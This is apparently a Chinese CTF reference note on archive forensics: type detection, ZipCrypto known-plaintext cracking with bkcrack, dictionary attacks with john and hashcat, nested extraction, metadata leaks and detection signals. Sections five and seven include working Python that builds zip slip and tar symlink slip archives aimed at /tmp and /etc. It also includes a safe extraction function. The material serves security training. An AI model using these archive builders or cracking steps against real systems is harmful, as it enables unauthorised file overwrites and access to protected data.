# 压缩包与归档：加密、嵌套、路径穿越、元数据

> 被 `competition-zip-archive` 引用。归档是"多层容器"：一层解开还有一层，每层的元数据
> 都可能是线索，每条解压路径都可能是穿越。

## 一、先判型（不要急着解压）

```bash
# 文件真实类型（不看扩展名）
file archive.zip
file -k archive.zip          # 更详细
xxd archive.zip | head -3

# 魔术字对照
# PK\x03\x04      → zip
# 7z\xbc\xaf\x27\x1c → 7z
# Rar!\x1a\x07\x00 → rar4
# Rar!\x1a\x07\x01\x00 → rar5
# \x1f\x8b          → gzip
# \xfd7zXZ\x00      → xz
# BZh               → bzip2
# \x28\xb5\x2f\xfd  → zstd
# MSCF              → cab
# \x37\x7a\xbc\xaf  → 7z（旧）
# \x04\x22\x4d\x18  → lz4
```

```bash
# 一条命令看所有层（不落盘）
binwalk archive.zip
# 或用 7z 列内容
7z l archive.zip
7z l -slt archive.zip        # 含 CRC、加密标记、时间
```

## 二、zip 的两种加密（一定要分清）

| 类型 | 标记 | 强度 | 攻击 |
| --- | --- | --- | --- |
| **ZipCrypto**（传统） | 头里 general purpose bit 0 = 1，无 AES 标记 | **弱** | 已知明文攻击（bkcrack） |
| **AES-256**（WinZip 扩展） | extra field 里 `0x9901`，method = 99 | 强 | 只能爆破口令 |

```bash
# 看是哪种
7z l -slt archive.zip | grep -iE 'method|encrypted|characteristics'
# Method = ZipCrypto_Deflate / Deflate  → ZipCrypto
# Method = AES-256 Deflate              → AES
```

```bash
# zipinfo 也能看
zipinfo -v archive.zip | grep -iE 'compression method|encrypted|AES'
```

### 2.1 ZipCrypto 的已知明文攻击（bkcrack）

原理：ZipCrypto 的密钥流只依赖明文，且有 12 字节的已知明文就能恢复内部密钥（不需要口令）。

```bash
# 需要 12 字节已知明文（同一压缩包内某个文件的已知内容的前 12 字节以上）
# 场景：压缩包里有 logo.png（你能拿到同一张图），就能用它解出其他加密文件的密钥
bkcrack -C archive.zip -c logo.png -p known_logo.png
# 输出 keys: 12345678 9abcdef0 11223344

# 用密钥解密任意文件（不需要口令）
bkcrack -C archive.zip -c secret.txt -k 12345678 9abcdef0 11223344 -d secret_plain.txt

# 或者直接改包：把加密文件替换成明文版本
bkcrack -C archive.zip -c secret.txt -k <keys> -U out.zip plain.txt
```

**已知明文的来源**（这是实战关键）：

| 来源 | 说明 |
| --- | --- |
| 同包内的未加密文件 | 最常见（作者只加密了部分文件） |
| 公开的标准文件 | `PK\x03\x04` 头、固定的 PNG 头、LICENSE 文本 |
| 你自己上传的文件 | 若系统把你上传的文件打包后再加密 |
| 文件格式的固定头 | JPEG 的 `\xff\xd8\xff\xe0\x00\x10JFIF`、PDF 的 `%PDF-1.4` |

```bash
# 用固定头做已知明文（PNG 的头是固定的 8 字节，不够 12，需要更多）
# 通常用"整个未加密文件的明文"最稳
# 生成候选明文：
python3 -c "open('known.bin','wb').write(b'\x50\x4b\x03\x04' + b'\x00'*8)"
```

### 2.2 AES zip 只能爆破

```bash
# 提取 hash（用 zip2john）
zip2john archive.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# 或 hashcat
hashcat -m 13600 hash.txt /usr/share/wordlists/rockyou.txt
# 13600 = WinZip AES
```

```bash
# 或直接 fcrackzip（ZipCrypto 更快）
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
```

## 三、7z / rar 的差异

| 特性 | zip | 7z | rar |
| --- | --- | --- | --- |
| 加密 | 逐文件（ZipCrypto/AES） | **整包或逐文件**（AES-256） | 逐文件（AES-256） |
| 头部加密 | 否（文件名可见） | 可（`-mhe=on` 后文件名也加密） | 可（`-hp` 加密头） |
| 已知明文攻击 | 可行（ZipCrypto） | **不可行**（AES + 随机 IV） | 不可行 |
| 字典攻击工具 | `fcrackzip`/`john` | `7z2john` + john | `rar2john` + john |
| 多卷 | 支持 | 支持 | 支持 |

```bash
# 7z 的头部是否加密
7z l -slt secret.7z 2>&1 | head -5
# "Cannot open encrypted archive. Wrong password?" → 头加密了（连文件名都看不到）

# 7z 爆破
7z2john secret.7z > h7.txt
john h7.txt --wordlist=rockyou.txt

# rar 爆破
rar2john secret.rar > hr.txt
john hr.txt --wordlist=rockyou.txt
```

**7z 头加密的后果**：`7z l` 看不到文件名/大小，只能盲爆。这让"从文件名猜内容"的路径失效。

## 四、嵌套归档的递归处理

```bash
# 手工逐层（可控，推荐）
mkdir -p layers && cd layers
cp ../archive.zip l0.zip
n=0
while :; do
  file "l$n.zip" 2>/dev/null | grep -qi 'archive\|compressed' || break
  mkdir -p "l$((n+1))"
  case "$(file -b l$n.zip)" in
    *Zip*)  unzip -o -q "l$n.zip" -d "l$((n+1))" ;;
    *7-zip*) 7z x -y -o"l$((n+1))" "l$n.zip" >/dev/null ;;
    *RAR*) unrar x -o+ "l$n.zip" "l$((n+1))/" >/dev/null ;;
    *gzip*) gunzip -c "l$n.zip" > "l$((n+1))/out" ;;
    *) break ;;
  esac
  # 找下一层
  next=$(find "l$((n+1))" -type f \( -name '*.zip' -o -name '*.7z' -o -name '*.rar' -o -name '*.gz' \) | head -1)
  [ -z "$next" ] && break
  cp "$next" "l$((n+1)).zip"
  n=$((n+1))
  [ $n -gt 10 ] && { echo "too deep"; break; }
done
find . -type f | head -50
```

```bash
# 自动递归（binwalk 的 -e 会尝试提取所有层）
binwalk -eM archive.zip
# -M 递归，-e 提取
ls _archive.zip.extracted/
```

```bash
# 批量看每层是什么
find . -type f -exec file {} \; | sed 's/: */ | /' | column -t -s'|'
```

**嵌套的关键**：**每层的文件名和目录结构都是线索**（`layer1/flag.txt`、`final/...`）。
不要用 `-j` 压平。

## 五、路径穿越（zip slip）

原理：归档里的文件名含 `../`，解压时写到目标目录之外。

```bash
# 构造一个 zip slip 包
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('slip.zip', 'w')
# 写到上级目录
z.writestr('../../tmp/pwned.txt', 'owned')
# 绝对路径（部分实现会处理）
z.writestr('/tmp/abs.txt', 'abs')
# Windows 路径
z.writestr('..\\..\\Windows\\Temp\\pwn.txt', 'win')
z.close()
print('created slip.zip')
PY

# 验证包内容（不解压）
unzip -l slip.zip
```

```bash
# 测试目标是否易受攻击（授权范围内）
# 1) 上传 slip.zip 到目标的上传/导入接口
# 2) 检查目标目录外是否出现文件
# 3) 或用本地同版本解压库验证
```

**易受攻击的实现**（判断依据）：

| 实现 | 是否校验 |
| --- | --- |
| Python `zipfile.extractall()` | **Python 3.6+ 会规范化并拒绝绝对路径，但仍可能穿越 `..`**（取决于版本） |
| Java `ZipEntry.getName()` + `new File(dir, name)` | **不校验 → 易受攻击** |
| Node `unzipper` / `adm-zip` | 老版本易受攻击 |
| Go `archive/zip` | 需自己校验（标准库不校验） |
| PHP `ZipArchive::extractTo()` | 会尝试规范化 |
| 7-Zip CLI | 3rd party 解压时可能询问 |

```python
# 安全的解压（示范正确写法，用于判断目标是否"应该"这样写）
import zipfile, os
def safe_extract(zf, dest):
    dest = os.path.realpath(dest)
    for name in zf.namelist():
        target = os.path.realpath(os.path.join(dest, name))
        if not target.startswith(dest + os.sep):
            raise ValueError(f'path traversal: {name}')
        zf.extract(name, dest)
```

**验伤**：目标目录之外出现文件（如 `/tmp/pwned.txt`），且内容是你写的。仅"解压成功"不算。

## 六、元数据泄露（最容易被忽略）

| 文件类型 | 元数据 | 命令 |
| --- | --- | --- |
| 图片 | EXIF（GPS、设备、时间、缩略图） | `exiftool img.jpg` |
| Office | 作者、公司、修订历史、隐藏批注 | `exiftool doc.docx`；`unzip -o doc.docx -d d/` 看 `docProps/` |
| PDF | 生产者、作者、创建工具 | `exiftool doc.pdf`；`pdfinfo doc.pdf` |
| zip 内文件 | 修改时间（可推断时区/作息） | `zipinfo -v a.zip` |
| git 归档 | `.git` 目录（完整历史） | `ls -a extracted/` |

```bash
# Office 文档的完整元数据
unzip -o doc.docx -d docx_extract/
cat docx_extract/docProps/core.xml | xmllint --format -
cat docx_extract/docProps/app.xml | xmllint --format -

# 找隐藏内容（批注、修订、隐藏文字）
grep -o '<w:ins[^>]*>' docx_extract/word/document.xml | head
grep -o 'w:vanish' docx_extract/word/document.xml | head
```

```bash
# zip 内的时间戳（推断时区）
zipinfo -v a.zip | grep -E 'file last modified|UTC'
# 若时间显示 "2024-01-15 09:30:00" 且时区未知 → 可结合其他线索推断
```

```bash
# 归档里有没有 .git（源码泄露）
unzip -l src.zip | grep -E '\.git/|\.env|config'
```

## 七、其他归档格式的坑

| 格式 | 特性 | 注意 |
| --- | --- | --- |
| **tar** | 保留权限/属主/符号链接 | 解压时 `--no-same-owner`，否则可能提权 |
| **tar.gz** | 先 tar 后 gz | 先 `gunzip` 再 `tar xf`，或 `tar xzf` |
| **cpio** | 常见于 initramfs | `cpio -idmv < file.cpio` |
| **ar / deb** | `ar x` 后是 `data.tar.*` | `ar t pkg.deb` |
| **cab** | Windows | `cabextract` |
| **iso** | 光盘镜像 | `7z x` 或 mount |
| **dmg** | macOS | `7z x` 或 `hdiutil` |
| **xz/zstd/lz4** | 现代压缩 | `xz -d`、`zstd -d`、`lz4 -d` |

```bash
# tar 的符号链接穿越（tar slip）
python3 - <<'PY'
import tarfile, io
t = tarfile.open('slip.tar','w')
# 创建一个指向 /etc 的符号链接，再通过它写文件
info = tarfile.TarInfo('link'); info.type = tarfile.SYMTYPE; info.linkname = '/etc'
t.addfile(info)
info2 = tarfile.TarInfo('link/pwned'); info2.size = 5
t.addfile(info2, io.BytesIO(b'owned'))
t.close()
PY
```

**tar 的解压风险**：符号链接 + 后续文件 → 写到链接目标。安全的解压要 `--no-same-owner`
并拒绝含 `..` 或绝对路径的成员。

## 八、口令爆破的优先级

```bash
# 1) 先试常见口令（速度最快）
for p in password 123456 admin root letmein qwerty 12345678 1234567890; do
  unzip -P "$p" -t archive.zip >/dev/null 2>&1 && { echo "FOUND: $p"; break; }
done

# 2) 再试与文件名/内容相关的（社工）
#    文件名、作者、日期、公司名

# 3) 最后才上字典
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt archive.zip
```

```bash
# 用 john 的统一流程（支持多种格式）
zip2john a.zip > h.txt && john h.txt --wordlist=rockyou.txt
7z2john b.7z > h7.txt && john h7.txt --wordlist=rockyou.txt
rar2john c.rar > hr.txt && john hr.txt --wordlist=rockyou.txt
```

**顺序很重要**：常见口令几分钟内解决，rockyou 要几十分钟。先做快的。

## 九、验伤：归档分析的"成功"

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 解出了加密内容 | 明文可读且语义自洽（是文本/图片可打开） | 解出乱码（口令错但工具没报错） |
| ZipCrypto 已知明文攻击成功 | `bkcrack` 输出的 keys 能解开**其他**文件 | 只解开了已知明文那个文件 |
| zip slip 生效 | 目标目录**之外**出现你的文件 | 文件在解压目录内（正常行为） |
| 嵌套层数确认 | 每层都能 `file` 识别且内容递进 | 只解了第一层就说"没有更多" |
| 元数据泄露 | EXIF/作者/时间有具体值 | 只有默认值（如 "Microsoft Office"） |

## 十、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| ZipCrypto 爆破 | 应用日志 | 对同一归档的高频解压尝试 |
| zip slip | 文件系统审计 | 解压后目标目录外出现新文件（尤其 `/tmp`、web 根） |
| 嵌套炸弹 | 资源监控 | 解压后文件数/大小爆炸；CPU/内存飙升 |
| 归档炸弹（zip bomb） | 磁盘/内存 | 单个归档解压后 > 1000 倍 |
| 元数据外泄 | — | 上传的文件带 GPS/作者信息（需在上传侧检测） |

```bash
# 检测 zip bomb：解压前估算
7z l -slt bomb.zip | grep -E '^Size|^Packed Size' | head
# 或看压缩比
unzip -l bomb.zip | tail -3
```

## 十一、常见坑

1. **只看扩展名**——`archive.zip` 可能是 rar/7z。先 `file`。
2. **ZipCrypto 与 AES 混淆**——AES 的包用 `bkcrack` 一定失败。先 `7z l -slt` 看 method。
3. **已知明文不足 12 字节**——`bkcrack` 需要至少 12 字节连续已知明文。PNG 头只有 8 字节，要加更多。
4. **嵌套只看第一层**——很多题的答案在第 3-5 层。写循环。
5. **`-j` 压平丢失结构**——目录名常是线索（`layer3/`、`final/`）。
6. **zip slip 测试污染目标**——写文件到目标系统是有副作用的，必须事先授权并清理。
7. **tar 的 owner/权限**——解压 tar 会尝试恢复属主，可能报错或产生意外权限。用 `--no-same-owner`。
8. **7z 头加密后看不到文件名**——`7z l` 报错不代表包坏了，是头加密了。只能盲爆口令。
9. **口令爆破顺序反了**——先试常见口令，再上字典。反了会浪费几十分钟。